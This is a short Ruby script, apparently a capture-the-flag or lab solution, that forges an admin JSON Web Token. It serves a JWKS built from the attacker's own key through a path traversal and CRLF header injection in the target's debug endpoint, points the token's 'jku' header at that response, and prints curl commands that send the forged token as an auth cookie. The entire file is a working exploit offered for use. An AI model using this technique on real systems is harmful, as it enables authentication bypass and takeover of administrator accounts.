require 'openssl'
require 'json'
require 'base64'
require 'cgi'

header = {"typ":"JWT","alg":"RS256","jku":"http://[URL]/.well-known//jwks.json"}
body = {"user":"admin"}

k = OpenSSL::PKey::RSA.new File.read "private.pem"
pub = k.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2), padding: false)
e = Base64.urlsafe_encode64(pub.e.to_s(2), padding: false)
jwks = {"keys" => [
	  { "kty" => "RSA", 
      "use"=> "sig",
      "kid"=> "[KID]",
      "n"=> n,
      "e"=> e,
      "alg"=> "RS256"}
       ]
}
jwk = JSON.dump jwks
len = jwk.size

URL = "http://[URL]/.well-known/../debug?value=1337%0d%0aContent-Length:+#{len}%0d%0a%0d%0a#{CGI.escape(jwk)}"
puts "curl '#{URL}' --dump-header -"

header["jku"]=URL

data = Base64.urlsafe_encode64(body.to_json).gsub("=","")
head = Base64.urlsafe_encode64(header.to_json).gsub("=","")

sig = k.sign("SHA256", head+"."+data)
puts head+"."+data+"."+Base64.urlsafe_encode64(sig).gsub("=","")

puts "curl -H 'Cookie: auth=#{head+"."+data+"."+Base64.urlsafe_encode64(sig).gsub("=","")}' http://[URL]/"
